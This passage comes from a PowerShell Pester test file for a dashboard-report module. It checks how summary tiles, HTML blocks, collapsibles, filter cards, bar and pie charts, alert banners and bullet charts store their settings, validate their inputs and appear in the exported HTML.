            @{ Label='Active'; Value=42; Action=@{ TableId='items'; Filter='active' } }
        )
        $report['Summary'][0].Action.TableId | Should -Be 'items'
        $report['Summary'][0].Action.Filter  | Should -Be 'active'
        $report['Summary'][0].Action.Url     | Should -Be ''
    }

    It 'Tile Action with Url is stored' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='Docs'; Value=42; Action=@{ Url='https://example.com' } }
        )
        $report['Summary'][0].Action.Url     | Should -Be 'https://example.com'
        $report['Summary'][0].Action.TableId | Should -Be ''
    }

    It 'Tile Action without TableId or Url throws' {
        { Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Action=@{ Label='Click' } }
        ) } | Should -Throw
    }

    It 'Tile Action with both TableId and Url throws' {
        { Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Action=@{ TableId='t'; Url='https://x' } }
        ) } | Should -Throw
    }

    It 'HTML emits action JSON on tile when set' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_TileAct_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(
                @{ Label='Errors'; Value=3
                   Action=@{ Label='View errors'; TableId='incidents'; Filter='critical' } }
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'incidents' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-tile-action.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"action":\{.*"tableId":"incidents".*"filter":"critical"'
            $content | Should -Match 'tile-clickable'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'HTML contains sparkline array, style and bounds in SUMMARY_CONFIG' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_SparkTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(
                @{ Label='CPU 24h'; Value=42; Sparkline=@(10,20,30,25,40); SparklineStyle='area'; SparklineMin=0; SparklineMax=100 }
                @{ Label='Reqs';    Value=99; Sparkline=@(5,8,3,9);        SparklineStyle='bars' }
                @{ Label='Plain';   Value=7 }  # no sparkline
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-spark.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            # First tile — area style with explicit bounds
            $content | Should -Match '"sparkline":\[10,20,30,25,40\]'
            $content | Should -Match '"sparklineStyle":"area"'
            $content | Should -Match '"sparklineMin":0'
            $content | Should -Match '"sparklineMax":100'
            # Second tile — bars with null bounds
            $content | Should -Match '"sparkline":\[5,8,3,9\]'
            $content | Should -Match '"sparklineStyle":"bars"'
            # Third tile — must NOT carry any sparkline keys
            $content | Should -Match '"label":"Plain"'
            # SPARK helper present
            $content | Should -Match 'var SPARK\s*=\s*\{'
            $content | Should -Match 'spark-svg'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhHtmlBlock
# ---------------------------------------------------------------------------
Describe 'Add-DhHtmlBlock' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
    }

    It 'Adds a block to the report Blocks list' {
        Add-DhHtmlBlock -Report $report -Id 'intro' -Content '<p>Hello</p>'
        $report['Blocks'] | Should -Not -BeNullOrEmpty
        $report['Blocks'].Count | Should -Be 1
    }

    It 'Stores BlockType as html' {
        Add-DhHtmlBlock -Report $report -Id 'b1' -Content '<p>x</p>'
        $report['Blocks'][0].BlockType | Should -Be 'html'
    }

    It 'Stores Id, Title, Icon, Content, Style correctly' {
        Add-DhHtmlBlock -Report $report -Id 'note' -Title 'Info Note' -Icon '📋' `
            -Content '<p>Details here.</p>' -Style 'warn' -AllowHtml:$true
        $b = $report['Blocks'][0]
        $b.Id      | Should -Be 'note'
        $b.Title   | Should -Be 'Info Note'
        $b.Icon    | Should -Be '📋'
        $b.Content | Should -Be '<p>Details here.</p>'
        $b.Style   | Should -Be 'warn'
    }

    It 'Defaults Style to info' {
        Add-DhHtmlBlock -Report $report -Id 'b2' -Content '<p>x</p>'
        $report['Blocks'][0].Style | Should -Be 'info'
    }

    It 'Rejects invalid Style values' {
        { Add-DhHtmlBlock -Report $report -Id 'b3' -Content '<p>x</p>' -Style 'invalid' } |
            Should -Throw
    }

    It 'Rejects Id with invalid characters' {
        { Add-DhHtmlBlock -Report $report -Id 'bad id!' -Content '<p>x</p>' } |
            Should -Throw
    }

    It 'Multiple blocks accumulate in order' {
        Add-DhHtmlBlock -Report $report -Id 'first'  -Content '<p>1</p>'
        Add-DhHtmlBlock -Report $report -Id 'second' -Content '<p>2</p>'
        $report['Blocks'].Count     | Should -Be 2
        $report['Blocks'][0].Id     | Should -Be 'first'
        $report['Blocks'][1].Id     | Should -Be 'second'
    }

    It 'HTML contains block content in exported report' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_HtmlTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhHtmlBlock -Report $report -Id 'myblock' -Content '<p>UniqueMarker42</p>'
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data @([PSCustomObject]@{X=1})
            $htmlPath = Join-Path $tmpDir2 'test-htmlblock.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            (Get-Content $htmlPath -Raw) | Should -Match 'UniqueMarker42'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhCollapsible
# ---------------------------------------------------------------------------
Describe 'Add-DhCollapsible' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
    }

    It 'Adds a collapsible block to the report' {
        Add-DhCollapsible -Report $report -Id 'sec1' -Title 'Section' -Cards @(
            @{ Title='Card A'; Fields=@(@{Label='L';Value='V'}) }
        )
        $report['Blocks'] | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType | Should -Be 'collapsible'
    }

    It 'Stores Id, Title, Icon, DefaultOpen correctly' {
        Add-DhCollapsible -Report $report -Id 'sec2' -Title 'My Section' -Icon '🔑' `
            -DefaultOpen $false -Cards @(@{ Title='C'; Fields=@() })
        $b = $report['Blocks'][0]
        $b.Id          | Should -Be 'sec2'
        $b.Title       | Should -Be 'My Section'
        $b.Icon        | Should -Be '🔑'
        $b.DefaultOpen | Should -Be $false
    }

    It 'Badge equals card count' {
        Add-DhCollapsible -Report $report -Id 'sec3' -Title 'T' -Cards @(
            @{ Title='C1'; Fields=@() }
            @{ Title='C2'; Fields=@() }
            @{ Title='C3'; Fields=@() }
        )
        $report['Blocks'][0].Badge | Should -Be 3
    }

    It 'Normalises missing Badge and BadgeClass on cards' {
        Add-DhCollapsible -Report $report -Id 'sec4' -Title 'T' -Cards @(
            @{ Title='Card'; Fields=@(@{Label='K';Value='V'}) }
        )
        $card = $report['Blocks'][0].Cards[0]
        $card['Badge']      | Should -Be ''
        $card['BadgeClass'] | Should -Be ''
    }

    It 'Throws when card is missing Title key' {
        { Add-DhCollapsible -Report $report -Id 'sec5' -Title 'T' -Cards @(
              @{ Fields=@() }
          ) } | Should -Throw
    }

    It 'Throws when card is missing Fields key' {
        { Add-DhCollapsible -Report $report -Id 'sec6' -Title 'T' -Cards @(
              @{ Title='C' }
          ) } | Should -Throw
    }

    It 'Accepts free-form Content instead of Cards' {
        Add-DhCollapsible -Report $report -Id 'sec7' -Title 'Notes' `
            -Content '<p>Some notes here.</p>' -AllowHtml:$true
        $report['Blocks'][0].Content | Should -Be '<p>Some notes here.</p>'
    }

    It 'HTML contains block section shell in exported report' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_ColTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhCollapsible -Report $report -Id 'accounts' -Title 'Accounts' -Cards @(
                @{ Title='Prod'; Fields=@(@{Label='ID';Value='123'}) }
            )
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data @([PSCustomObject]@{X=1})
            $htmlPath = Join-Path $tmpDir2 'test-collapsible.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            (Get-Content $htmlPath -Raw) | Should -Match 'bsection-accounts'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhFilterCard
# ---------------------------------------------------------------------------
Describe 'Add-DhFilterCard' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        Add-DhTable -Report $report -TableId 'resources' -Title 'Resources' -Data @(
            [PSCustomObject]@{ Name='vm01'; Location='Italy North' }
            [PSCustomObject]@{ Name='vm02'; Location='West Europe' }
        )
    }

    It 'Adds a filtercardgrid block to the report' {
        Add-DhFilterCard -Report $report -Id 'loc-filter' -Title 'Filter by Location' `
            -TargetTableId 'resources' -FilterField 'Location' `
            -Cards @(@{ Label='Italy North'; Value='Italy North'; Count=1 })
        $report['Blocks'][0].BlockType | Should -Be 'filtercardgrid'
    }

    It 'Stores TargetTableId and FilterField correctly' {
        Add-DhFilterCard -Report $report -Id 'f1' -Title 'T' `
            -TargetTableId 'resources' -FilterField 'Location' `
            -Cards @(@{ Label='L'; Value='V' })
        $b = $report['Blocks'][0]
        $b.TargetTableId | Should -Be 'resources'
        $b.FilterField   | Should -Be 'Location'
    }

    It 'Normalises optional card fields with safe defaults' {
        Add-DhFilterCard -Report $report -Id 'f2' -Title 'T' `
            -TargetTableId 'resources' -FilterField 'Location' `
            -Cards @(@{ Label='Italy'; Value='Italy North' })
        $card = $report['Blocks'][0].Cards[0]
        $card['SubLabel'] | Should -Be ''
        $card['Count']    | Should -BeNullOrEmpty
        $card['Icon']     | Should -Be ''
    }

    It 'Throws when target table does not exist' {
        { Add-DhFilterCard -Report $report -Id 'f3' -Title 'T' `
              -TargetTableId 'nonexistent' -FilterField 'Location' `
              -Cards @(@{ Label='L'; Value='V' }) } | Should -Throw
    }

    It 'MultiFilter defaults to false (switch not present)' {
        Add-DhFilterCard -Report $report -Id 'f4' -Title 'T' `
            -TargetTableId 'resources' -FilterField 'Location' `
            -Cards @(@{ Label='L'; Value='V' })
        $report['Blocks'][0].MultiFilter.IsPresent | Should -Be $false
    }

    It 'MultiFilter switch can be set' {
        Add-DhFilterCard -Report $report -Id 'f5' -Title 'T' `
            -TargetTableId 'resources' -FilterField 'Location' `
            -MultiFilter `
            -Cards @(@{ Label='L'; Value='V' })
        $report['Blocks'][0].MultiFilter.IsPresent | Should -Be $true
    }
}

# ---------------------------------------------------------------------------
# Add-DhBarChart
# ---------------------------------------------------------------------------
Describe 'Add-DhBarChart' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        Add-DhTable -Report $report -TableId 'inventory' -Title 'Inventory' -Data @(
            [PSCustomObject]@{ Name='A'; Type='VM'      }
            [PSCustomObject]@{ Name='B'; Type='Disk'    }
            [PSCustomObject]@{ Name='C'; Type='VM'      }
            [PSCustomObject]@{ Name='D'; Type='Network' }
        )
    }

    It 'Adds a barchart block to the report' {
        Add-DhBarChart -Report $report -Id 'type-chart' -Title 'Types' `
            -TableId 'inventory' -Field 'Type'
        $report['Blocks'][0].BlockType | Should -Be 'barchart'
    }

    It 'Stores all configuration properties correctly' {
        Add-DhBarChart -Report $report -Id 'bc1' -Title 'Chart' `
            -TableId 'inventory' -Field 'Type' -TopN 5
        $b = $report['Blocks'][0]
        $b.Id      | Should -Be 'bc1'
        $b.TableId | Should -Be 'inventory'
        $b.Field   | Should -Be 'Type'
        $b.TopN    | Should -Be 5
    }

    It 'ShowPercent defaults to false (switch not present)' {
        Add-DhBarChart -Report $report -Id 'bc2' -Title 'T' `
            -TableId 'inventory' -Field 'Type'
        $report['Blocks'][0].ShowPercent.IsPresent | Should -Be $false
    }

    It 'ShowPercent switch can be set' {
        Add-DhBarChart -Report $report -Id 'bc3' -Title 'T' `
            -TableId 'inventory' -Field 'Type' -ShowPercent
        $report['Blocks'][0].ShowPercent.IsPresent | Should -Be $true
    }

    It 'ClickFilters switch can be set' {
        Add-DhBarChart -Report $report -Id 'bc4' -Title 'T' `
            -TableId 'inventory' -Field 'Type' -ClickFilters
        $report['Blocks'][0].ClickFilters.IsPresent | Should -Be $true
    }

    It 'Throws when source table does not exist' {
        { Add-DhBarChart -Report $report -Id 'bc5' -Title 'T' `
              -TableId 'nonexistent' -Field 'Type' } | Should -Throw
    }

    It 'Throws when TopN is zero or negative' {
        { Add-DhBarChart -Report $report -Id 'bc6' -Title 'T' `
              -TableId 'inventory' -Field 'Type' -TopN 0 } | Should -Throw
        { Add-DhBarChart -Report $report -Id 'bc7' -Title 'T' `
              -TableId 'inventory' -Field 'Type' -TopN -1 } | Should -Throw
    }

    It 'HTML contains barchart block in exported report' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_BarTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhBarChart -Report $report -Id 'bc-export' -Title 'Types Chart' `
                -TableId 'inventory' -Field 'Type' -TopN 5
            $htmlPath = Join-Path $tmpDir2 'test-barchart.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"barchart"'
            $content | Should -Match '"tableId":"inventory"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Stacked variant (v1.4 F12) ------------------------------------------
    It 'Stacked defaults to false (single-series unchanged)' {
        Add-DhBarChart -Report $report -Id 'bc-flat' -Title 'X' `
            -TableId 'inventory' -Field 'Type'
        $report['Blocks'][0].Stacked     | Should -Be $false
        $report['Blocks'][0].SeriesField | Should -BeNullOrEmpty
    }

    It '-Stacked + -SeriesField are stored' {
        Add-DhBarChart -Report $report -Id 'bc-stack' -Title 'X' `
            -TableId 'inventory' -Field 'Type' -SeriesField 'Status' -Stacked
        $report['Blocks'][0].Stacked     | Should -Be $true
        $report['Blocks'][0].SeriesField | Should -Be 'Status'
    }

    It '-Stacked without -SeriesField throws' {
        { Add-DhBarChart -Report $report -Id 'bc-bad' -Title 'X' `
              -TableId 'inventory' -Field 'Type' -Stacked } | Should -Throw
    }

    It '-SeriesField same as -Field throws' {
        { Add-DhBarChart -Report $report -Id 'bc-bad2' -Title 'X' `
              -TableId 'inventory' -Field 'Type' -SeriesField 'Type' -Stacked } | Should -Throw
    }

    It '-SeriesField alone (without -Stacked) auto-stacks' {
        # Least-surprising default: passing -SeriesField is a clear stacking intent
        Add-DhBarChart -Report $report -Id 'bc-auto' -Title 'X' `
            -TableId 'inventory' -Field 'Type' -SeriesField 'Status'
        $report['Blocks'][0].Stacked     | Should -Be $true
        $report['Blocks'][0].SeriesField | Should -Be 'Status'
    }

    It 'HTML contains stacked + seriesField in barchart JSON' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_StackTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhBarChart -Report $report -Id 'bc-html' -Title 'Items by Type stacked by Status' `
                -TableId 'inventory' -Field 'Type' -SeriesField 'Status' -Stacked -TopN 5
            $htmlPath = Join-Path $tmpDir2 'test-stacked.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"barchart"'
            $content | Should -Match '"stacked":true'
            $content | Should -Match '"seriesField":"Status"'
            $content | Should -Match 'function renderBarChartStacked'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhAlertBanner  (v1.4)
# ---------------------------------------------------------------------------
Describe 'Add-DhAlertBanner' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
    }

    It 'Adds a banner to the report AlertBanners list' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'Hello' -Severity 'info'
        $report['AlertBanners'] | Should -Not -BeNullOrEmpty
        $report['AlertBanners'].Count | Should -Be 1
        $report['AlertBanners'][0].Id       | Should -Be 'b1'
        $report['AlertBanners'][0].Severity | Should -Be 'info'
        $report['AlertBanners'][0].Message  | Should -Be 'Hello'
    }

    It 'Defaults Severity to info' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'Default sev test'
        $report['AlertBanners'][0].Severity | Should -Be 'info'
    }

    It 'Stores Dismissible flag' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'Dismiss me' -Dismissible
        $report['AlertBanners'][0].Dismissible | Should -Be $true
    }

    It 'Dismissible defaults to false when switch not present' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'Sticky'
        $report['AlertBanners'][0].Dismissible | Should -Be $false
    }

    It 'Accepts multiple banners in declaration order' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'First'  -Severity 'info'
        Add-DhAlertBanner -Report $report -Id 'b2' -Message 'Second' -Severity 'warning'
        Add-DhAlertBanner -Report $report -Id 'b3' -Message 'Third'  -Severity 'critical'
        $report['AlertBanners'].Count | Should -Be 3
        $report['AlertBanners'][0].Id | Should -Be 'b1'
        $report['AlertBanners'][2].Severity | Should -Be 'critical'
    }

    It 'Throws on duplicate Id' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'First'
        { Add-DhAlertBanner -Report $report -Id 'b1' -Message 'Second' } | Should -Throw
    }

    It 'Throws on invalid Id characters' {
        { Add-DhAlertBanner -Report $report -Id 'bad id' -Message 'M' } | Should -Throw
        { Add-DhAlertBanner -Report $report -Id 'bad/id' -Message 'M' } | Should -Throw
    }

    It 'Throws on invalid Severity' {
        { Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' -Severity 'panic' } | Should -Throw
    }

    It 'Stores Action with TableId + Filter' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' `
            -Action @{ Label='View'; TableId='items'; Filter='critical' }
        $a = $report['AlertBanners'][0].Action
        $a.Label   | Should -Be 'View'
        $a.TableId | Should -Be 'items'
        $a.Filter  | Should -Be 'critical'
        $a.Url     | Should -Be ''
    }

    It 'Stores Action with Url' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' `
            -Action @{ Label='Docs'; Url='https://example.com/kb' }
        $a = $report['AlertBanners'][0].Action
        $a.Label | Should -Be 'Docs'
        $a.Url   | Should -Be 'https://example.com/kb'
    }

    It 'Throws when Action is missing Label' {
        { Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' `
              -Action @{ TableId='items' } } | Should -Throw
    }

    It 'Throws when Action has neither TableId nor Url' {
        { Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' `
              -Action @{ Label='Click' } } | Should -Throw
    }

    It 'Throws when Action has both TableId and Url' {
        { Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' `
              -Action @{ Label='X'; TableId='items'; Url='https://x' } } | Should -Throw
    }

    It 'HTML contains ALERTS_CONFIG with banner message in exported report' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_AlertTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhAlertBanner -Report $report -Id 'ab-crit' -Severity 'critical' `
                -Message '3 incidents open' -Dismissible `
                -Action @{ Label='View'; TableId='incidents'; Filter='critical' }
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'incidents' -Title 'Incidents' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-alert.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"id":"ab-crit"'
            $content | Should -Match '"severity":"critical"'
            $content | Should -Match '"message":"3 incidents open"'
            $content | Should -Match '"dismissible":true'
            $content | Should -Match '"label":"View"'
            $content | Should -Match '"tableId":"incidents"'
            $content | Should -Match '"filter":"critical"'
            $content | Should -Match 'id="report-alerts"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'HTML omits banners block when none declared (empty ALERTS_CONFIG)' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_AlertTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 't' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-no-alert.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match 'ALERTS_CONFIG\s*=\s*\[\]'
            $content | Should -Match 'id="report-alerts"'   # container still present (collapses via CSS :empty)
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- v1.4.2 — NavGroup binding on banners --------------------------------
    It 'Banner without NavGroup stores empty NavGroup (page-global)' {
        Add-DhAlertBanner -Report $report -Id 'b' -Message 'X' -Severity 'info'
        $report['AlertBanners'][0].NavGroup    | Should -BeNullOrEmpty
        $report['AlertBanners'][0].NavSubGroup | Should -BeNullOrEmpty
    }

    It 'Banner with -NavGroup stores the group' {
        Add-DhAlertBanner -Report $report -Id 'b' -Message 'X' -Severity 'info' -NavGroup 'Identity'
        $report['AlertBanners'][0].NavGroup | Should -Be 'Identity'
    }

    It 'Banner with -NavSubGroup stores both' {
        Add-DhAlertBanner -Report $report -Id 'b' -Message 'X' -Severity 'info' `
            -NavGroup 'Identity' -NavSubGroup 'Production'
        $report['AlertBanners'][0].NavGroup    | Should -Be 'Identity'
        $report['AlertBanners'][0].NavSubGroup | Should -Be 'Production'
    }

    It 'HTML emits navGroup attr when set' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_AlertNav_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhAlertBanner -Report $report -Id 'b-id' -Severity 'warning' `
                -Message 'identity-scoped' -NavGroup 'Identity'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 't' -Title 'T' -Data $data -NavGroup 'Identity'
            $htmlPath = Join-Path $tmpDir2 'test-alert-nav.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"navGroup":"Identity"'
            # CSS hide-by-default rule emitted
            $content | Should -Match '\.alert-banner\[data-navgroup\]:not\(\.panel-active\)'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhPieChart  (v1.4)
# ---------------------------------------------------------------------------
Describe 'Add-DhPieChart' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $data = @(
            [PSCustomObject]@{ Name='alpha'; Region='us-east'; Status='Active' }
            [PSCustomObject]@{ Name='beta';  Region='eu-west'; Status='Active' }
            [PSCustomObject]@{ Name='gamma'; Region='us-east'; Status='Inactive' }
        )
        Add-DhTable -Report $script:report -TableId 'items' -Title 'Items' -Data $data
    }

    It 'Adds a piechart block to the report (Mode A — from table)' {
        Add-DhPieChart -Report $report -Id 'p1' -Title 'By region' `
            -TableId 'items' -Field 'Region'
        $report['Blocks'] | Should -Not -BeNullOrEmpty
        $b = $report['Blocks'][0]
        $b.BlockType | Should -Be 'piechart'
        $b.Mode      | Should -Be 'fromtable'
        $b.TableId   | Should -Be 'items'
        $b.Field     | Should -Be 'Region'
        $b.Style     | Should -Be 'donut'   # default
    }

    It 'Adds a piechart block (Mode B — explicit slices)' {
        Add-DhPieChart -Report $report -Id 'p2' -Title 'Costs' `
            -Slices @(
                @{ Label='us-east'; Value=12500 }
                @{ Label='eu-west'; Value=8200  }
            )
        $b = $report['Blocks'][0]
        $b.Mode | Should -Be 'explicit'
        $b.Slices.Count | Should -Be 2
        $b.Slices[0].Label | Should -Be 'us-east'
        $b.Slices[0].Value | Should -Be 12500
    }

    It 'Accepts Style = pie' {
        Add-DhPieChart -Report $report -Id 'p3' -Title 'X' `
            -TableId 'items' -Field 'Status' -Style 'pie'
        $report['Blocks'][0].Style | Should -Be 'pie'
    }

    It 'Rejects invalid Style values' {
        { Add-DhPieChart -Report $report -Id 'p4' -Title 'X' `
              -TableId 'items' -Field 'Status' -Style 'sphere' } | Should -Throw
    }

    It 'Throws when neither TableId nor Slices specified' {
        { Add-DhPieChart -Report $report -Id 'p5' -Title 'X' } | Should -Throw
    }

    It 'Throws when both TableId and Slices specified' {
        { Add-DhPieChart -Report $report -Id 'p6' -Title 'X' `
              -TableId 'items' -Field 'Status' `
              -Slices @(@{ Label='a'; Value=1 }) } | Should -Throw
    }

    It 'Throws when -TableId is set without -Field' {
        { Add-DhPieChart -Report $report -Id 'p7' -Title 'X' -TableId 'items' } | Should -Throw
    }

    It 'Throws when source table does not exist' {
        { Add-DhPieChart -Report $report -Id 'p8' -Title 'X' `
              -TableId 'nonexistent' -Field 'Status' } | Should -Throw
    }

    It 'Throws when a slice is missing Label' {
        { Add-DhPieChart -Report $report -Id 'p9' -Title 'X' `
              -Slices @(@{ Value=1 }) } | Should -Throw
    }

    It 'Throws when a slice is missing Value' {
        { Add-DhPieChart -Report $report -Id 'p10' -Title 'X' `
              -Slices @(@{ Label='a' }) } | Should -Throw
    }

    It 'Throws when a slice has a non-numeric Value' {
        { Add-DhPieChart -Report $report -Id 'p11' -Title 'X' `
              -Slices @(@{ Label='a'; Value='not-a-number' }) } | Should -Throw
    }

    It 'Throws when a slice has a negative Value' {
        { Add-DhPieChart -Report $report -Id 'p12' -Title 'X' `
              -Slices @(@{ Label='a'; Value=-5 }) } | Should -Throw
    }

    It 'Stores ClickFilters switch (Mode A)' {
        Add-DhPieChart -Report $report -Id 'p13' -Title 'X' `
            -TableId 'items' -Field 'Status' -ClickFilters
        $report['Blocks'][0].ClickFilters | Should -Be $true
    }

    It 'ClickFilters defaults to false' {
        Add-DhPieChart -Report $report -Id 'p14' -Title 'X' `
            -TableId 'items' -Field 'Status'
        $report['Blocks'][0].ClickFilters | Should -Be $false
    }

    It 'Preserves slice Color when supplied' {
        Add-DhPieChart -Report $report -Id 'p15' -Title 'X' `
            -Slices @(
                @{ Label='a'; Value=10; Color='#FF0000' }
                @{ Label='b'; Value=20 }
            )
        $report['Blocks'][0].Slices[0].Color | Should -Be '#FF0000'
        $report['Blocks'][0].Slices[1].Color | Should -Be ''
    }

    It 'HTML contains piechart block with style + mode (Mode A)' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_PieTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhPieChart -Report $report -Id 'pie-A' -Title 'By status' `
                -TableId 'items' -Field 'Status' -ClickFilters -Style 'donut'
            $htmlPath = Join-Path $tmpDir2 'test-pie-a.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"piechart"'
            $content | Should -Match '"mode":"fromtable"'
            $content | Should -Match '"style":"donut"'
            $content | Should -Match '"tableId":"items"'
            $content | Should -Match '"field":"Status"'
            $content | Should -Match '"clickFilters":true'
            $content | Should -Match 'function renderPieChart'
            $content | Should -Match 'function buildPieSvg'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'HTML contains piechart block with explicit slices (Mode B)' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_PieTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhPieChart -Report $report -Id 'pie-B' -Title 'Costs' `
                -Style 'pie' `
                -Slices @(
                    @{ Label='us-east'; Value=12500 }
                    @{ Label='eu-west'; Value=8200  }
                )
            $htmlPath = Join-Path $tmpDir2 'test-pie-b.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"piechart"'
            $content | Should -Match '"mode":"explicit"'
            $content | Should -Match '"style":"pie"'
            $content | Should -Match '"label":"us-east"'
            $content | Should -Match '"value":12500'
            $content | Should -Match '"label":"eu-west"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhBullet  (v1.4 F10)
# ---------------------------------------------------------------------------
Describe 'Add-DhBullet' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:rag = @{
            Green = @{ Max = 50 }
            Amber = @{ Min = 50; Max = 80 }
            Red   = @{ Min = 80 }
        }
    }

    It 'Adds a bullet block to the report Blocks list' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='DC01'; Value=42; Target=50; Max=120; Unit='ms' }
        )
        $report['Blocks']               | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType  | Should -Be 'bullet'
        $report['Blocks'][0].Id         | Should -Be 'b1'
